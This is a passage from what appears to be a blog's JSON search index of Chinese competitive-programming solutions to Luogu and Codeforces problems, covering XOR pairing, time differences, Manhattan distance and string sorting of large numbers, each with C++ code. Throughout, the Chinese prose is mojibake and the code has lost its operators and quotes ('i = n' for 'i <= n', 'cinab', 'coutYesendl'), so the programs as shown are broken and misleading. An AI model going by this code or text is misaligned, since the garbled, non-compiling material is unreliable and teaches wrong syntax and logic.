cinnmk; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) cina[i][j]; for(int i = 1;i = n;++i) for(int j = 1;j = m;++j) if(!vis[i][j] a[i][j] == O) w++;search(i,j); if(!check()) cout0endl; return 0; for(int i = 1;i = w;++i) ll sum = k; for(int j = 2;j = an[i];++j) sum *= k - 1,sum %= MOD; ans *= sum,ans %= MOD; coutansendl; return 0;void search(int x,int y) q.push(x,y); vis[x][y] = 1;an[w]++; for(int i = 0;i 4;++i) int xx = x + dx[i],yy = y + dy[i]; if(1 = xx 1 = yy xx = n y = m !vis[xx][yy] a[xx][yy] == O) search(xx,yy); bool check() int tt = 0; if(q.size() == 1) q.pop(); return 1;//ç‰¹åˆ¤ while(!q.empty())//æ£€æŸ¥ int t = 0; node ch = q.front();q.pop(); if(a[ch.x][ch.y - 1] == O) t++; if(a[ch.x][ch.y + 1] == O) t++; if(a[ch.x - 1][ch.y] == O) t++; if(a[ch.x + 1][ch.y] == O) t++; if(t == 1) tt++; if(t 2) return 0;//ç›¸é‚»åº§ä½å¤§äº2 //coutch.x ch.y tendl; if(tt == 2) return 1;//ç›¸é‚»åº§ä½åªæœ‰1çš„ç‚¹æ°å¥½åªæœ‰2ä¸ª else return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF1345A Puzzle Pieces","path":"/2020/05/30/CF1345A/","content":"ç”±é¢˜ç›®å¯çŸ¥ï¼Œè‹¥ $n = 1$ æˆ–è€… $m = 1$ï¼Œä¸€å®šå¯ä»¥åƒæ ·ä¾‹ $1$ ä¸€æ ·å¯ä»¥æ‹¼å‡ºæ¥ã€‚ä»¥ $n = 1$ ä¸ºä¾‹ï¼Œåšæ³•å¦‚ä¸‹ï¼šå‡¹å£åˆ†åˆ«å‘å³ï¼Œä¸‹ï¼Œå·¦ï¼Œå·¦â€¦â€¦å·¦ï¼ˆå…± $n - 2$ ä¸ªå·¦ï¼‰ã€‚ å†æ¥åˆ†æå…¶å®ƒçš„ï¼Œå‘ç° $n = 2,m = 2$ æ—¶ä¸ºæ ·ä¾‹ $2$ æ—¶æœ‰è§£ï¼Œè€Œå½“ $n = 2,m = 3$ æ—¶æ˜¯å…¶å®ƒæ›´å¤§çš„æ¨¡å‹çš„åŸºç¡€ï¼Œä½†å°è¯•åå‘ç°è¿™ä¸ªæ— æ³•æ‹¼å‡ºã€‚æ‰€ä»¥åªæœ‰ä¸¤ç§æƒ…å†µæœ‰è§£ï¼Œä»£ç å¦‚ä¸‹ï¼š #include iostreamusing namespace std;int main() int t,a,b; cint; while(t--) cinab; if(a == 2 b == 2 ||a == 1 || b == 1) coutYesendl; else coutNoendl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP1469 æ‰¾ç­·å­","path":"/2020/05/15/P1469/","content":"é˜…è¯»é¢˜ç›®ï¼Œæœ‰è¿™å¥è¯ï¼šè¿™äº›ç­·å­ä¸­åªæœ‰ä¸€åªç­·å­æ˜¯è½å•çš„ï¼Œå…¶ä½™éƒ½æˆåŒã€‚å› æ­¤æˆ‘ä»¬ç”±è¿™å¥è¯å¯ä»¥å—åˆ°ä¸€äº›å¯å‘ã€‚å†çœ‹é¢˜ç›®çš„å†…å­˜é™åˆ¶ï¼Œåªæœ‰ 4MBï¼Œæ‰€ä»¥å¯¹ç©ºé—´æœ‰äº†å¾ˆå¤§çš„è¦æ±‚ã€‚ æ ¹æ®é¢˜æ„ï¼Œæˆ‘ä»¬éœ€è¦æ‰¾åˆ°è½å•çš„ç­·å­ï¼Œé‚£ä¹ˆå¦‚ä½•è¿›è¡ŒæˆåŒçš„é…å¯¹å‘¢ï¼Ÿå¾ˆç®€å•ï¼Œå°±æ˜¯å¼‚æˆ–ã€‚ä¸¤ä¸ªç›¸åŒçš„æ•° x^x çš„å€¼ä¸€å®šä¸º $0$ã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä» $1$ è‡³ $n$ æ‰«ä¸€éï¼Œè¿›è¡Œå¼‚æˆ– ans ^= xã€‚è‹¥ç¬¬ $x$ ä¸ªæ•°çš„é•¿åº¦å·²ç»é…å¯¹ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°å°†ä¸ä¹‹å‰çš„æŸä¸ªæ•°å¾—åˆ° $0$ çš„ç»“æœï¼Œåˆ™æœ€å ans çš„å€¼ä¹Ÿå°±æ˜¯è½å•çš„ç­·å­çš„é•¿åº¦äº†ã€‚ æ³¨æ„ï¼šæ•°æ®è¯»å…¥å¯¹ç¨‹åºæ•ˆç‡é€ æˆçš„å½±å“ï¼ å› æ­¤æˆ‘ä»¬åœ¨ç¨‹åºè®¾è®¡æ—¶ä½¿ç”¨å¿«è¯»ï¼Œä»£ç å¦‚ä¸‹ï¼š #include iostream#include cstdiousing namespace std;inline int read();int main() int n,x,ans = 0; n = read(); for(register int i = 1;i = n;++i) x = read(),ans ^= x; printf(%d ,ans); return 0;inline int read() long long s = 0,f = 1; char ch = getchar(); while((ch 0 || ch 9) ch != EOF) if(ch == -) f = -1; ch = getchar(); while(ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar(); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6547 [COCI2010-2011#2] NAPOR","path":"/2020/05/15/P6547/","content":"åˆšå¼€å§‹åšè¿™é“é¢˜ï¼Œæœ€å…ˆæƒ³åˆ°çš„ä¾¿æ˜¯å­—ç¬¦ä¸²ä¸ int ä¹‹é—´çš„è½¬æ¢ã€‚ å¯¹äºç¬¬ $n_i$ è¡Œæ•´è¡Œè¾“å…¥ï¼Œè‹¥è¾“å…¥æ•°å­—ï¼Œåˆ™éœ€è¦åœ¨ä¸‹ä¸€ä¸ªä¸æ˜¯æ•°å­—çš„ä½ç½®çš„åœ°æ–¹è®°å½•ï¼Œç„¶åæŠŠæ‰€å¾—æ•°å­—åŠ å…¥ç­”æ¡ˆä¸­ã€‚å½“ç„¶ï¼Œç­”æ¡ˆä¸º ans = ans * 10 + str[i] - 0ã€‚åŒæ—¶ï¼Œé¢˜ç›®ä¸­çš„ ä»–è¿˜å¿…é¡»çœç•¥æ–‡æœ¬ä¸­æ•°å­—å¯èƒ½åŒ…å«çš„ä»»ä½•å‰å¯¼é›¶ è¿™å¥è¯ååˆ†å…³é”®ï¼Œå› æ­¤æ•°å­— $0$ éœ€è¦ç‰¹åˆ¤ã€‚æœ€åï¼Œå› ä¸º åœ¨æ–‡æœ¬ä¸­æ‰¾åˆ°æ‰€æœ‰æ•°å­—ï¼Œå¹¶ä»¥ä¸é™åºçš„é¡ºåºè¾“å‡ºï¼Œæ‰€ä»¥éœ€è¦è¿›è¡Œä¸€æ¬¡æ’åºã€‚ äºæ˜¯æˆ‘ä»¬å°±å¾—åˆ°äº†ä»¥ä¸‹è¿™ä¸ªä»£ç ï¼š #include iostream#include string#include algorithmusing namespace std;const int MAX = 550;int a[MAX];int main() int n,k = 0,tmp; string str; cinn; for(int i = 1;i = n;i++) cinstr;tmp = 0;//åˆå§‹åŒ– bool ok = 0;//æ•°å­—æœ‰æ— å‡ºç° for(int j = 0;j str.size();j++) if(0 = str[j] str[j] = 9) tmp = tmp * 10 + str[j] - 0,ok = 1;//æ•°å­—å‡ºç° else if(ok) a[++k] = tmp;//åŠ å…¥ç­”æ¡ˆ tmp = 0,ok = 0;//æ¸…é›¶ if(ok) a[++k] = tmp;//åŠ å…¥ç­”æ¡ˆ sort(a + 1,a + k + 1);//æ’åº for(int i = 1;i = k;i++) couta[i]endl; return 0; å½“ç„¶ï¼Œè¿™ä¸ªæ€è·¯ä¹Ÿè®¸åªèƒ½è¿‡ $1-2$ ä¸ªæµ‹è¯•ç‚¹ï¼ŒåŸå› å¾ˆç®€å• æ¯ä¸ªå­—ç¬¦ä¸²é•¿åº¦ä¸è¶…è¿‡ 100ï¼Œå› æ­¤å½“è¯¥å­—ç¬¦ä¸²å…¨éƒ¨ä¸ºæ•°å­—æ—¶ï¼Œè‚¯å®šä¼šçˆ† long longã€‚é‚£ä¹ˆå¦‚ä½•è§£å†³å‘¢ï¼Ÿ å…¨éƒ¨éƒ½ä½¿ç”¨å­—ç¬¦ä¸²æ¥è®°å½•æ•°å­—ï¼ æŠŠæ‰€å¾—çš„æ•°å­—åŠ å…¥ç­”æ¡ˆä¸­ï¼Œè¿™æ¬¡çš„åŠ æ³•ä¸ä¸Šé¢ä¸ä¸€æ ·ï¼Œå› ä¸ºéƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦ ans += str[i]ã€‚ åŒæ—¶ï¼Œå‰å¯¼ $0$ çš„å‡ºç°åŒæ ·æ˜¯å…³é”®ï¼Œæˆ‘ä»¬ä»¥é¢˜ç›®ä¸­çš„æ ·ä¾‹ $3$ ä¸ºä¾‹ï¼Œæˆ‘ä»¬åœ¨è¿™ $n$ è¡Œå…¨éƒ¨è¾“å…¥å®Œæ¯•åï¼Œä¼šä¾æ¬¡å¾—åˆ°è¿™å‡ ä¸ªæ•°å­—ï¼š01 02 007 03 04 000ã€‚æ‰€ä»¥æˆ‘ä»¬åœ¨æ’åºä¹‹å‰éœ€è¦åˆ é™¤å‰å¯¼ $0$ï¼Œå½“ç„¶ï¼Œç­”æ¡ˆä¸º $0$ çš„æƒ…å†µæˆ‘ä»¬ä¾ç„¶è¦æ³¨æ„ï¼Œæ ¸å¿ƒä»£ç (æœ‰æ³¨é‡Š)ï¼š for(int i = 1;i = k;i++)//åˆ å»å‰å¯¼0 tmp = ;bool ok = 0;//åˆå§‹åŒ– for(int j = 0;j a[i].size();j++)//ä¾æ¬¡æšä¸¾ if(a[i][j] != 0) ok = 1;//ç¬¬ä¸€ä¸ªä¸ä¸º0çš„æ•°å­— if(ok) tmp += a[i][j];//è®°å½•æœ‰æ•ˆæ•°ä½ if(ok) a[i] = tmp;//èµ‹å€¼ else a[i] = 0;//ä¸º0çš„ç‰¹æ®Šæƒ…å†µ ç»è¿‡å¤„ç†ï¼Œè¿™å‡ ä¸ªæ•°å­—å°±å˜æˆäº†ï¼š1 2 7 3 4 0ã€‚äºæ˜¯ä¹ï¼Œæ¥ä¸‹å»å°±æ˜¯æ’åºäº†ã€‚æ’åºæ—¶æ˜¯å°†ä¸¤ä¸ªå­—ç¬¦ä¸²è¿›è¡Œæ¯”è¾ƒï¼Œæ‰€ä»¥éœ€è¦ä¸€ä¸ª bool cmp(string x,string y) å‡½æ•°ã€‚è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²æ‰€ç»„æˆçš„æ•°æœ‰ä¸¤ç§æƒ…å†µ(ä¸ºè¡¨ç¤ºæ–¹ä¾¿ï¼Œä»¥ä¸‹ string x çš„é•¿åº¦ä¸º $sx$ï¼Œstring yçš„é•¿åº¦ä¸º $sy$)ï¼š â‘  $sx = sy$ æ•°ä½ç›¸åŒï¼Œæˆ‘ä»¬éœ€è¦é€ä¸€è¿›è¡Œæ¯”è¾ƒï¼Œå³ return x y;â‘¡ $sx eq sy$ æ•°ä½ä¸åŒï¼Œæ›´åŠ æ–¹ä¾¿ï¼Œç›´æ¥æ¯”è¾ƒæ•°ä½å¤§å°ï¼Œå³ return sx sy; ç»è¿‡è¿™æ ·çš„åˆ†æï¼Œæœ€åæˆ‘ä»¬æ’åºååªéœ€è¦é€ä¸€è¾“å‡ºå³å¯ï¼Œä¸€è¡Œä¸€ä¸ªã€‚æœ€åæ˜¯ AC ä»£ç ï¼š #include iostream#include string#include algorithmusing namespace std;const int MAX = 550;string a[MAX];bool cmp(string x,string y) if(x.size() != y.size()) return x.size() y.size();//æ•°ä½ä¸åŒ else return x y;//æ•°ä½ç›¸åŒ int main() int n,k = 0; string str,tmp; cinn; for(int i = 1;i = n;i++) cinstr;tmp = ;//åˆå§‹åŒ– bool ok = 0;//æ•°å­—æœ‰æ— å‡ºç° for(int j = 0;j str.size();j++) if(0 = str[j] str[j] = 9) tmp += str[j],ok = 1;//æ•°å­—å‡ºç° else if(ok) a[++k] = tmp;//åŠ å…¥ç­”æ¡ˆ tmp = ,ok = 0;//æ¸…0 if(ok) a[++k] = tmp;//åŠ å…¥ç­”æ¡ˆ for(int i = 1;i = k;i++)//åˆ å»å‰å¯¼0 tmp = ;bool ok = 0;//åˆå§‹åŒ– for(int j = 0;j a[i].size();j++)//ä¾æ¬¡æšä¸¾ if(a[i][j] != 0) ok = 1;//ç¬¬ä¸€ä¸ªä¸ä¸º0çš„æ•°å­— if(ok) tmp += a[i][j];//è®°å½•æœ‰æ•ˆæ•°ä½ if(ok) a[i] = tmp;//èµ‹å€¼ else a[i] = 0;//ä¸º0çš„ç‰¹æ®Šæƒ…å†µ sort(a + 1,a + k + 1,cmp); for(int i = 1;i = k;i++) couta[i]endl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼š[QkOI#R1] Quark and Equations","path":"/2020/05/04/P6511/","content":"è¿™é“é¢˜ç»™å®š $n,m$ï¼Œè¦æ±‚æ–¹ç¨‹ç»„çš„è§£çš„æ•°é‡ã€‚è‹¥æ— è§£ï¼Œåˆ™è¾“å‡º $0$ã€‚ $\\texttt{Subtask 1}$ ç›´æ¥ä¸¤å±‚å¾ªç¯ï¼Œä» $1$ è‡³ $\\max(n,m)$ æšä¸¾ $i,j$ï¼Œè‹¥æ»¡è¶³æ¡ä»¶ï¼Œåˆ™å°†ç­”æ¡ˆ $+1$ã€‚ $\\texttt{Subtask 2}$ ç”±æ–¹ç¨‹ç»„çš„ $i + j = n$ å¯çŸ¥ $i = n - j$ï¼Œä¹Ÿå°±æ˜¯è¯´å¯¹äºä¸€ä¸ª $i$ éƒ½ä¼šæœ‰ä¸€ä¸ªå¯¹åº”çš„ $j$ï¼Œå› æ­¤å¯ä»¥åŒ–ç®€ä¸ºä¸€å±‚å¾ªç¯ã€‚ $\\texttt{Subtask 3-5}$ å½“ $m = 1$æ—¶ï¼Œ$\\lfloor \\dfrac{i}{j} \\rfloor + \\lceil \\dfrac{j}{i} \\rceil = 1$ã€‚ç”±é¢˜çŸ¥ï¼Œ$i 0,j 0$ï¼Œåˆ™ $\\lfloor\\dfrac{i}{j}\\rfloor =0,\\lceil\\dfrac{j}{i}\\rceil =1$ï¼Œå³ $j i$ ä¸” $j \\le i$,æ˜¾ç„¶æ­¤æ—¶æ— è§£ã€‚ è€Œå½“ $m n$ æˆ– $m \\in[n - 1,n]$ æ—¶ï¼ŒåŒç†èƒ½è¯å¾—æ— è§£ã€‚ $\\texttt{subtask 6}$ æœ€åæ¥çœ‹æ­£è§£ï¼Œå¯¹ $i,j$è¿›è¡Œåˆ†ç±»è®¨è®ºã€‚ $i j$ï¼Œ$\\lfloor \\dfrac{i}{j} \\rfloor = 0$ï¼Œå³ $\\lceil \\dfrac{j}{i} \\rceil = m$ã€‚ $i \\ge j$ï¼Œ$\\lceil \\dfrac{j}{i} \\rceil= 1$ï¼Œå³ $\\lfloor \\dfrac{i}{j} \\rfloor = m + 1$ã€‚ è”ç«‹ä¸¤å¼ï¼Œäºæ˜¯æˆ‘ä»¬å°±èƒ½å¾—åˆ°ä¸¤ä¸ªä¸ç­‰å¼ï¼Œæ•´ç†å¯å¾—æœ€ç»ˆç­”æ¡ˆä¸ºï¼š$\\lceil \\dfrac{n - 1}{m} \\rceil - \\lceil \\dfrac{n - 1}{m + 1} \\rceil + \\lceil \\dfrac{n}{m} \\rceil - \\lceil \\dfrac{n}{m + 1} \\rceil$ã€‚ ä»£ç ï¼šæ³¨æ„ç‰¹åˆ¤å“¦ï¼ #include bits/stdc++.husing namespace std;int main() int t; scanf(%d,t); while(t--) long long ans = 0,n,m;scanf(%lld%lld,n,m); if(m == 1) cout0endl; continue; ans = floor((n - 1) / m) - floor((n - 1) / (m + 1)) + floor(n / m) - floor(n / (m + 1)); printf(%lld ,ans); return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6460 [COCI2006-2007#5] NATRIJ","path":"/2020/04/24/P6460/","content":"æˆ‘ä»¬è¿ç”¨å­—ç¬¦ä¸²æ¥è¾“å…¥è¿™ä¸¤ä¸ªæ—¶é—´ç‚¹ã€‚é‚£ä¹ˆæ‰€è¾“å…¥çš„ä¸€ä¸ªæ—¶é—´çš„å­—ç¬¦é•¿åº¦ä¸º $8$ï¼ˆXX:XX:XXï¼‰ã€‚é‚£ä¹ˆæˆ‘ä»¬æŠŠä¸¤ä¸ªæ—¶é—´ç»Ÿä¸€å•ä½ä¸ºç§’é’Ÿåä½œå·®ï¼Œç„¶åå†è¿›è¡Œæ±‚è§£ã€‚é‚£ä¹ˆæˆ‘ä»¬è®¾è¾“å…¥çš„ä¸€ä¸ªå­—ç¬¦ä¸²ä¸º strï¼Œå†åˆ†åˆ«æ¥çœ‹æ—¶åˆ†ç§’ã€‚ æ—¶ï¼š(str[0] - 0) * 10 + str[1] - 0 åˆ†ï¼š(str[3] - 0) * 10 + str[4] - 0 ç§’ï¼š(str[6] - 0) * 10 + str[7] - 0 ç„¶åå°†è¿™äº›å†…å®¹åˆ†åˆ« $\\times 3600,60,1$ åˆ™èƒ½å¾—åˆ°ç»Ÿä¸€å•ä½çš„æ—¶é—´å’Œã€‚ç„¶åæˆ‘ä»¬å°†ä¸¤è€…ä½œå·®ã€‚åˆ™ä¼šæœ‰ $3$ ç§æƒ…å†µï¼š str_end - str_start 0ï¼Œç›´æ¥è¿›è¡Œè½¬æ¢è¾“å‡ºå³å¯ã€‚ str_end - str_start == 0ï¼Œç”±é¢˜å¯çŸ¥æ­£å¥½ä¸º $24$ ä¸ªå°æ—¶ï¼Œéœ€è¦ç‰¹åˆ¤è¾“å‡ºã€‚ str_end - str_start 0ï¼Œå³è·¨äº†ä¸€å¤©,éœ€è¦åŠ ä¸Š $24$ ä¸ªå°æ—¶ï¼ˆä¹Ÿå°±æ˜¯ $24 \\times 3600$ ç§’ï¼‰ã€‚ æœ€åå°±æ˜¯è¾“å‡ºäº†ï¼Œè®°å¾—è¾“å‡º $0$ çš„ç‰¹æ®Šæƒ…å†µï¼Œåœ¨æ­¤ä¸èµ˜è¿°ã€‚ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.husing namespace std;int main() string a,b;int ans = 0; cinab; //startä¸endçš„æ—¶é—´æ±‚å’Œï¼ˆå•ä½ï¼šç§’ï¼‰ int timea = ((a[0] - 0) * 10 + a[1] - 0) * 3600 + ((a[3] - 0) * 10 + a[4] - 0) * 60 + ((a[6] - 0) * 10 + a[7] - 0); int timeb = ((b[0] - 0) * 10 + b[1] - 0) * 3600 + ((b[3] - 0) * 10 + b[4] - 0) * 60 + ((b[6] - 0) * 10 + b[7] - 0); ans = timeb - timea;//ä½œå·® if(timea == timeb)//ç‰¹åˆ¤ cout24:00:00endl; return 0; if(timea timeb) ans += 24 * 3600;//éš”äº†ä¸€å¤© //æ¢ç®—è¾“å‡ºï¼Œæ³¨æ„0çš„æƒ…å†µ if(ans / 3600 10) cout0; coutans / 3600:; if(ans % 3600 / 60 10) cout0; coutans % 3600 / 60:; if(ans % 3600 % 60 10) cout0; coutans % 3600 % 60endl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6427 [COCI2008-2009#1] PTICE","path":"/2020/04/19/P6427/","content":"é¦–å…ˆå…ˆè¦å¾—å‡ºè¿™ä¸‰ä¸ªäººçš„å¾ªç¯èŠ‚ï¼Œåˆ†åˆ«ä¸ºï¼šABCï¼ŒBABCä¸ CCAABBã€‚ç„¶åå°±ç”¨è¿™ä¸‰ä¸ªä¸åŒçš„å¾ªç¯èŠ‚å»æ¯”è¾ƒæ­£ç¡®ç­”æ¡ˆã€‚å…¶ä¸­éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨å¾—å‡ºæœ€é«˜çš„æ­£ç¡®æ•°åï¼Œè¿˜è¦åˆ¤æ–­æœ‰å‡ ä¸ªäººéƒ½è·å¾—äº†æœ€é«˜çš„åˆ†æ•°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œè¾“å‡ºçš„å§“åä¸åª $1$ ä¸ªï¼Œè¿™ä¸€ç‚¹éœ€è¦é¢å¤–æ³¨æ„ã€‚ #include bits/stdc++.husing namespace std;int main() int n,ans[3],num = 0;string str,d[3] = ABC,BABC,CCAABB,name[3] = Adrian,Bruno,Goran; cinnstr; for(int i = 0;i 3;i++) ans[i] = 0;//æ¯ä¸ªäººçš„ç­”æ¡ˆåˆå§‹åŒ– for(int j = 0;j = str.size() - 1;j++) if(str[j] == d[i][j % d[i].size()]) ans[i]++;//ä¾æ¬¡æ¯”è¾ƒå¾ªç¯èŠ‚ num = max(num,ans[i]);//è®°å½•æœ€é«˜çš„æ­£ç¡®æ•°é‡ coutnumendl; for(int i = 0;i 3;i++)//å¯èƒ½ä¸åªä¸€ä¸ª if(ans[i] == num) coutname[i]endl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6352 [COCI2007-2008#3] CETIRI","path":"/2020/04/10/P6352/","content":"ç»™å‡ºçš„ä¸‰ä¸ªæ•°å¯èƒ½æœ‰ä¸¤ç§æƒ…å†µï¼ˆè®¾å››ä¸ªæ•°ä¸º $ABCD$ï¼‰ï¼š å·²ç»ä¸ºç­‰å·®æ•°åˆ—ï¼Œè¿™ä¸ªå¾ˆå¥½åˆ¤æ–­ã€‚å·²ç»ç»™å‡ºäº† $ABC$ï¼Œåˆ™ $D$ ç­‰äº $A-B$ æˆ– $B-C$ï¼Œåˆ™ $D$ å¯ä»¥ç­‰äº $A-D$ æˆ– $C+D$ã€‚ æ­¤æ—¶æœªæˆä¸ºç­‰å·®æ•°åˆ—ï¼Œå³ $A - B eq B - C$ï¼Œè‹¥å¢åŠ ä¸€ä¸ªæ•°æˆä¸ºç­‰å·®æ•°åˆ—ï¼Œå¿…å®šæœ‰ $A D C$ï¼Œæ‰€ä»¥æˆ‘ä»¬åªè¦åˆ¤æ–­ $D$ åº”è¯¥å† $AB$ ä¹‹é—´è¿˜æ˜¯ $BC$ ç›´æ¥ã€‚å¤§å®¶ä¸€å®šèƒ½æƒ³åˆ° $D$ ä¸€å®šéœ€è¦æ”¾åœ¨ä¸¤æ•°ä¹‹å·®å¤§çš„åœ°æ–¹æ‰å¯èƒ½æœ‰è§£ï¼Œå› æ­¤å°±æœ‰ï¼š$\\begin{cases}A-BB-C,D=A+\\frac{B-A}{2}\\\\A-BB-C,D=B+\\frac{C-B}{2}\\\\\\end{cases}$ å½“ç„¶ï¼Œä»¥ä¸Šå…ˆè¦å¯¹è¿™ä¸‰ä¸ªæ•°å…ˆæ’åºï¼Œå› ä¸ºå…¶ä½™çš„ä¸‰ä¸ªæ•°çš„é¡ºåºè¢«æ‰“ä¹±äº†ã€‚ä»£ç å¦‚ä¸‹ï¼š #include iostream#include algorithmusing namespace std;int main() int a[4]; cina[1]a[2]a[3]; sort(a + 1,a + 4); if(a[2] - a[1] == a[3] - a[2]) couta[3] + (a[2] - a[1])endl; if(a[2] - a[1] a[3] - a[2]) couta[1] + (a[2] - a[1]) / 2endl; if(a[2] - a[1] a[3] - a[2]) couta[2] + (a[3] - a[2]) / 2endl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6330 [COCI2007-2008#1] CETVRTA","path":"/2020/04/09/P6330/","content":"é¦–å…ˆå¤§å®¶éœ€è¦çŸ¥é“ä»€ä¹ˆæ˜¯çŸ©å½¢ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚çŸ©å½¢æ˜¯å››ä¸ªè§’å‡ä¸º 90 åº¦çš„ç‰¹æ®Šçš„å¹³è¡Œå››è¾¹å½¢ã€‚æ—¢ç„¶æ˜¯å¹³è¡Œå››è¾¹å½¢ï¼Œé‚£ä¹ˆä¸€å®šå¯¹è¾¹å¹³è¡Œä¸”ç›¸ç­‰ï¼Œå³ $AB = CD$ ä¸” $AB \\parallel CD$ï¼Œ$AD = BC$ ä¸” $AD\\parallel BC$ã€‚é‚£ä¹ˆå°±æœ‰ $A$ ä¸ $D$ï¼Œ$B$ ä¸ $C$ çš„ $x$ è½´åæ ‡ç›¸ç­‰ï¼›$A$ ä¸ $B$ï¼Œ$C$ ä¸ $D$ çš„ $y$ è½´åæ ‡ç›¸ç­‰ã€‚é‚£ä¹ˆå°±æœ‰ï¼Œè¾“å…¥çš„ä¸‰ä¸ªæ•°ä¸­ï¼Œæ‰¾å‡ºå•ç‹¬æœªé…å¯¹çš„ç‚¹ $x$ åæ ‡ä¸ $y$ åæ ‡ï¼Œè¾“å‡ºå³å¯ã€‚ #include iostreamusing namespace std;int main() int x1,y1,x2,y2,x3,y3; cinx1y1x2y2x3y3; if(x1 == x2) coutx3 ; if(x1 == x3) coutx2 ; if(x2 == x3) coutx1 ; if(y1 == y2) couty3endl; if(y1 == y3) couty2endl; if(y2 == y3) couty1endl; return 0; ä¸çŸ¥é“å¤§å®¶çœ‹åˆ°æ‰¾æœªé…å¯¹çš„æ•°åæœ‰ä»€ä¹ˆè”æƒ³ï¼Ÿæç¤ºï¼šä¸¤ä¸ªç›¸åŒçš„æ•°è¿›è¡Œå¼‚æˆ–å€¼ä¸º $0$ã€‚ å› æ­¤å°±å¯ä»¥æŠŠ $x$ ä¸ $y$ åˆ†åˆ«å¼‚æˆ–ï¼Œé‚£ä¹ˆé…å¯¹çš„æ•°å€¼ä¸º $0$ï¼Œå‰©ä¸‹çš„ç­”æ¡ˆä¹Ÿå°±æ˜¯è¦è¾“å‡ºçš„æ•°äº†ã€‚ #include iostreamusing namespace std;int main() int x,y,ansx = 0,ansy = 0; for(int i = 1;i = 3;i++) cinxy,ansx ^= x,ansy ^= y; coutansx ansyendl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6315 [COCI2006-2007#3] NPUZZLE","path":"/2020/04/08/P6315/","content":"è¿™é“é¢˜ç›®çš„å‰ç½®çŸ¥è¯†ï¼Œæ›¼å“ˆé¡¿è·ç¦»ï¼Œå³ä¸ºï¼š$|x_1 - x_2| + |y_1 - y_2|$ã€‚è¿™æ˜¯åŸæ¥å­—æ¯çš„æ ‡å‡†ä½ç½®ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªç»“æ„ä½“å‚¨å­˜è¿™å‡ ä¸ªå­—æ¯çš„åæ ‡ï¼Œä¸‹æ ‡ä» $0$ å¼€å§‹ã€‚ struct letter int x,y;a[15] = 1,1,1,2,1,3,1,4,2,1,2,2,2,3,2,4,3,1,3,2,3,3,3,4,4,1,4,2,4,3;//std æ¥ä¸‹å»æ˜¯è¾“å…¥ï¼Œç”¨ä¸¤å±‚å¾ªç¯ for(int i = 1;i = 4;i++) ä¸ for(int j = 1;j = 4;j++)ï¼Œ$i$ å’Œ $j$ æ­£å¥½è¡¨ç¤ºè¾“å…¥çš„å­—æ¯çš„åæ ‡ã€‚æˆ‘ä»¬ç°åœ¨è¦æ±‚çš„æ˜¯æ‰€æœ‰å­—æ¯ä»å½“å‰ä½ç½®åˆ°è‡ªå·±çš„æ ‡å‡†ä½ç½®çš„æ›¼å“ˆé¡¿è·ç¦»ä¹‹å’Œï¼Œå› æ­¤è¾“å…¥çš„.ä¸éœ€è¦è¢«è®¡ç®—ã€‚é‚£ä¹ˆè¿™æ ·åªéœ€è¦æŠŠ $i$ ä¸ $j$ åˆ†åˆ«ä¸è¯¥å­—æ¯çš„æ ‡å‡†è¿›è¡Œæ¯”è¾ƒæ±‚å’Œå°±å¯ä»¥äº†ã€‚ï¼ˆæ³¨æ„ï¼š$\\texttt{A}$ çš„ $\\text{ASCII}$ çš„å€¼ç­‰äº $65$ï¼Œæ ‡å‡†çš„ä¸‹æ ‡ä» $0$ å¼€å§‹ï¼‰ #include iostream#include cmathusing namespace std;struct letter int x,y;a[15] = 1,1,1,2,1,3,1,4,2,1,2,2,2,3,2,4,3,1,3,2,3,3,3,4,4,1,4,2,4,3;//std int main() int ans = 0;char ch; for(int i = 1;i = 4;i++) for(int j = 1;j = 4;j++) cinch; if(ch != .) ans += abs(a[ch - 65].x - i) + abs(a[ch - 65].y - j);//Açš„ASCIIå€¼ä¸º65 coutansendl; return 0;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šP6321 [COCI2006-2007#4] SKENER","path":"/2020/04/08/P6321/","content":"æŒ‰ç…§é¢˜æ„è¿›è¡Œè¾“å‡ºï¼š å¯¹äºæ¯ä¸€è¡Œçš„ç¬¬ $c_j$ ä¸ªå­—æ¯ï¼Œéƒ½è¦è¾“å‡º $zc$ éã€‚ å¯¹äºæ¯ä¸€è¡Œï¼Œéƒ½è¦è¾“å‡º $zr$ éã€‚ æ‰€ä»¥å°±æœ‰äº†å››é‡å¤§å¾ªç¯ï¼Œå¦‚ä¸‹ï¼š#include iostreamusing namespace std;int main() char a[55][55]; int r,c,zr,zc; cinrczrzc; for(int i = 0;i r;i++) for(int j = 0;j c;j++) cina[i][j]; for(int i = 0;i r;i++) for(int k = 0;k zr;k++) for(int j = 0;j c;j++) for(int l = 0;l zc;l++) couta[i][j]; coutendl; return 0; å½“ç„¶ï¼Œå› ä¸ºæ¯ä¸€è¡Œä¸­æœ‰ $r$ ç»„å­—æ¯éƒ½é‡å¤å‡ºç°äº† $zc$ æ¬¡ï¼Œæ¯ä¸€è¡Œéƒ½é‡å¤å‡ºç°äº† $zr$ æ¬¡ï¼Œæ‰€ä»¥è¿˜å¯ä»¥å†åŒ–ç®€ä¸€ä¸‹ï¼Œå¦‚ä¸‹ï¼š#include iostreamusing namespace std;int main() char a[55][55]; int r,c,zr,zc; cinrczrzc; for(int i = 0;i r;i++) for(int j = 0;j c;j++) cina[i][j]; for(int i = 0;i r * zr;i++) for(int j = 0;j c * zc;j++) couta[i / zr][j / zc];//æ³¨æ„è¿™é‡Œ coutendl; return 